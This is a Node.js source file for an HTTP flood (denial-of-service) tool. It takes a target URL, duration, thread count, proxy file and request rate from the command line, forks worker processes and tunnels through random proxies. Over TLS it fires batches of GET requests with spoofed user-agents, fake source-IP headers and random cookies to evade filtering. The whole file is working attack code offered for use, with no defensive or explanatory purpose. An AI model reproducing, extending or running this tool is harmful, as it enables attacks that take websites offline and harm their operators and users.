var 
http = require('http')
cluster = require('cluster')
tls = require('tls')
url = require('url')
fs = require('fs') ;
const { constants } = require('crypto');
async = require('async')
require('events').EventEmitter.defaultMaxListeners = 0;

const errorHandler = error => {
//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);


target = process.argv[2]
time = process.argv[3]
thread = process.argv[4]
proxyF = process.argv[5]
rps = process.argv[6]



if (process.argv.length < 6) {
    console.log('Ex : node http target time thread proxy rps')
    process.exit(0)
}
var proxies = fs.readFileSync(proxyF, 'utf-8').toString().replace(/\r/g, '').split('\n');

cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
    , ]
    const RDOM = {
        cipher() {
            return cplist[Math.floor(Math.random() * cplist.length)];
        }
    , }
    
if (cluster.isMaster) {
	console.clear()
    console.log('http1/1 creat by string')

	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	flood()
}
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

 function flood() {
       parsed = url.parse(target);
       var cipper = RDOM.cipher();
       
       var randIp = randomIp();
       var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11","Windows NT 11.0"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Windows NT 11.0": `${Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}.0` : `Win64; x64`}`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`,
  "X11":  `Linux x86_64`
};
var browserss = [
	`Firefox/118.0`,
	`Firefox/117.0`,
	`Firefox/116.0`,
	`Firefox/115.0`,
	`Firefox/114.0`,
	`Firefox/113.0`,
	`Firefox/112.0`,
	`Firefox/111.0`,
	`Firefox/110.0`,
	`Firefox/109.0`,
]
var browsers = [
	"Chrome/118.0.0.0 Safari/537.36",
   "Chrome/117.0.0.0 Safari/537.36",
   "Chrome/116.0.0.0 Safari/537.36",
   "Chrome/115.0.0.0 Safari/537.36",
   "Chrome/114.0.0.0 Safari/537.36",
   "Chrome/113.0.0.0 Safari/537.36",
   "Chrome/112.0.0.0 Safari/537.36",
   "Chrome/111.0.0.0 Safari/537.36",
   "Chrome/110.0.0.0 Safari/537.36",
   "Chrome/109.0.0.0 Safari/537.36",
   "Chrome/108.0.0.0 Safari/537.36",
  "Version/16.5 Safari/605.1.15",
  "Chrome/118.0.0.0 Safari/537.36 Edg/118", 
  "Chrome/117.0.0.0 Safari/537.36 Edg/117", 
  "Chrome/116.0.0.0 Safari/537.36 Edg/116", 
 "Chrome/115.0.0.0 Safari/537.36 Edg/115",
 "Chrome/114.0.0.0 Safari/537.36 Edg/114",
 "Chrome/113.0.0.0 Safari/537.36 Edg/113",
 "Chrome/112.0.0.0 Safari/537.36 Edg/112",
 "Chrome/111.0.0.0 Safari/537.36 Edg/111",
 "Chrome/110.0.0.0 Safari/537.36 Edg/110",
 "Chrome/109.0.0.0 Safari/537.36 Edg/109",
 "Chrome/108.0.0.0 Safari/537.36 Edg/108",
 "Chrome/118.0.0.0 Safari/537.36 Vivaldi/118",
 "Chrome/117.0.0.0 Safari/537.36 Vivaldi/117",
 "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
 "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
 "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
 "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
 "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
 "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
 "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
 "Chrome/109.0.0.0 Safari/537.36 Vivaldi/109",
 "Chrome/118.0.0.0 Safari/537.36 OPR/118",
 "Chrome/117.0.0.0 Safari/537.36 OPR/117",
 "Chrome/116.0.0.0 Safari/537.36 OPR/116",
 "Chrome/115.0.0.0 Safari/537.36 OPR/115",
 "Chrome/114.0.0.0 Safari/537.36 OPR/114",
 "Chrome/113.0.0.0 Safari/537.36 OPR/113",
 "Chrome/112.0.0.0 Safari/537.36 OPR/112",
 "Chrome/111.0.0.0 Safari/537.36 OPR/111",
 "Chrome/110.0.0.0 Safari/537.36 OPR/110",
 "Chrome/109.0.0.0 Safari/537.36 OPR/109",
 "Chrome/108.0.0.0 Safari/537.36 OPR/108",			 
];
function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 
const randomBrowser = getRandomValue(browsers);
const randomsBrowser = getRandomValue(browserss);
var uas =  Math.random() < 0.5 ? `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`: `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:109.0) Gecko/20100101 ${randomsBrowser}`
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}



function generateRandomHeader(headers) {
  const randomIndex = Math.floor(Math.random() * headers.length);
  return [headers[randomIndex]];
}

function generateRandomRequest(parsed, uas) {
const randstrsValue = randstr(25);
const header3 = [
    "dnt: 1",
    "te: trailers",
     "origin:" + " https://" + parsed.host,
    "referer:" + " https://" + parsed.host + "/",
    "source-ip: "+ randIp ,
    "viewport-height: 1080" ,
    "viewport-width: 1920",
    "device-memory: 0.25",
    ];
    const header2 = [
    "dnt: 1",
     "origin:" + " https://" + parsed.host,
     "referer:" + " https://" + parsed.host + "/",
     "cookie: " +  generateRandomString(1,5) + "=" + generateRandomString(120,150),
    "viewport-height: 1080",
    "viewport-width: 1920",
    "device-memory: 0.25",
    ];
    
    
    var header1 = [ 
    'x-aspnet-version: ' + randstrsValue,
    ]
    var header4 = [ 
    'accept-charset: ' + randstrsValue,
    'Accept-Ranges: '+ Math.random() < 0.5 ? 'bytes' : 'none',
    ]
    const header5 = [
    "worker: " + Math.random() < 0.5 ? 'true' : 'null',
    "service-worker-navigation-preload: " + Math.random() < 0.5 ? 'true' : 'null' ,
    "expect-ct: enforce",
    ]
    var header6 = [
        "HTTP2-Setting: " + Math.random() < 0.5 ? 'token64' : 'token68',
        undefined
    ]
    const headers = [
        'GET / HTTP/1.1',
        'Host: ' + parsed.host,
        'Connection: Keep-Alive',
        'cache-control: ' + (Math.random() < 0.5 ? 'no-cache, no-store, max-age=0' : 'max-age=' + randstra(5)),
        "upgrade-insecure-requests: 1",
        'User-Agent: ' + uas + generateRandomString(1,10),
    ];
const header1Values = generateRandomHeader(header1);
const header2Values = generateRandomHeader(header2);
const header3Values = generateRandomHeader(header3);
const header4Values = generateRandomHeader(header4);
const header5Values = generateRandomHeader(header5);
const header6Values = generateRandomHeader(header6);
    const header = [
        ...headers,
        ...header1Values, 
    ...header2Values ,
    ...header3Values ,
    ...header4Values ,
    ...header5Values ,
    ...header6Values ,
    ]
    
      return header.join('\r\n');
    }
    setInterval(() => { 
    var proxys = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxys.split(':');
    var connection = http.request({ 
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsed.host + ":443"
    }, (err) => { 
        connection.end();
        return;
    
    });


         
        connection.on('connect', function (res, socket, head) {
            var tlsfin = tls.connect({
                host: parsed.host,
                ciphers: cipper, 
                secureProtocol: 'TLSv1_2_method',
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
            
                for (let i = 0; i < rps; i++) {
                        var request = generateRandomRequest(parsed, uas)
                          tlsfin.write(request + '\r\n\r\n' )
                          tlsfin.write(request + '\r\n\r\n' )
                          tlsfin.write(request + '\r\n\r\n' )
                          tlsfin.write(request + '\r\n\r\n' )
                }
            }
            )

            tlsfin.on('error', function(data) {
                tlsfin.end();
                tlsfin.destroy();
            });
    
            tlsfin.on('data', function (data) {
                return;
            });
         })
 connection.end();
 })
 }
 //flood() 




